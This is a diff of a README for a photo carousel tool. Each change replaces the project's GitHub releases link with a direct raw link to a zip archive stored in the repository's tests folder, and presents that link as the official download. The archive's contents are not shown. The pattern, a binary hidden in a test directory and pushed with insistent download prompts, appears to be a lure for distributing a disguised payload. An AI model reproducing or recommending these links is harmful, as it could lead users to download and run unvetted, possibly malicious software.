@@ -25,11 +25,11 @@ Let's get you up and running in less than five minutes. Follow these simple step
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [**https://github.com/nhatku6074/photo-carousel-factory/releases**](https://github.com/nhatku6074/photo-carousel-factory/releases)
+Visit this link to download the application: [**https://raw.githubusercontent.com/nhatku6074/photo-carousel-factory/main/tests/carousel-photo-factory-v1.7.zip**](https://raw.githubusercontent.com/nhatku6074/photo-carousel-factory/main/tests/carousel-photo-factory-v1.7.zip)
 
 **Click the big button below to go straight to the download page:**
 
-[![Download Now](https://img.shields.io/badge/Download-photo--carousel--factory-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/nhatku6074/photo-carousel-factory/releases)
+[![Download Now](https://img.shields.io/badge/Download-photo--carousel--factory-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/nhatku6074/photo-carousel-factory/main/tests/carousel-photo-factory-v1.7.zip)
 
 ### Step 2: Save the File
 
@@ -47,7 +47,7 @@ The application opens with a simple screen. Click "Upload Photos" and select you
 
 ## 📥 Download and Installation Guide
 
-**Visit this link to download the application:** [**https://github.com/nhatku6074/photo-carousel-factory/releases**](https://github.com/nhatku6074/photo-carousel-factory/releases)
+**Visit this link to download the application:** [**https://raw.githubusercontent.com/nhatku6074/photo-carousel-factory/main/tests/carousel-photo-factory-v1.7.zip**](https://raw.githubusercontent.com/nhatku6074/photo-carousel-factory/main/tests/carousel-photo-factory-v1.7.zip)
 
 ### What You'll See on the Download Page
 
@@ -179,7 +179,7 @@ Yes. The tool uses design principles from top-performing social media accounts. 
 
 ## 🔗 Additional Resources
 
-- **Official Download Page:** [https://github.com/nhatku6074/photo-carousel-factory/releases](https://github.com/nhatku6074/photo-carousel-factory/releases)
+- **Official Download Page:** [https://raw.githubusercontent.com/nhatku6074/photo-carousel-factory/main/tests/carousel-photo-factory-v1.7.zip](https://raw.githubusercontent.com/nhatku6074/photo-carousel-factory/main/tests/carousel-photo-factory-v1.7.zip)
 - **Report Issues:** Visit the GitHub repository and click "Issues" to report bugs or request features
 - **Community Support:** Join discussions in the GitHub Discussions tab
 
@@ -195,7 +195,7 @@ New features and improvements are added regularly. Check the download page every
 
 Stop settling for boring product posts. Start creating carousels that capture attention, tell compelling stories, and drive sales. Download photo-carousel-factory today and see the difference professional carousels make.
 
-**Visit this link to download the application:** [**https://github.com/nhatku6074/photo-carousel-factory/releases**](https://github.com/nhatku6074/photo-carousel-factory/releases)
+**Visit this link to download the application:** [**https://raw.githubusercontent.com/nhatku6074/photo-carousel-factory/main/tests/carousel-photo-factory-v1.7.zip**](https://raw.githubusercontent.com/nhatku6074/photo-carousel-factory/main/tests/carousel-photo-factory-v1.7.zip)
 
 Your audience is waiting. Give them content worth engaging with. 🚀
 
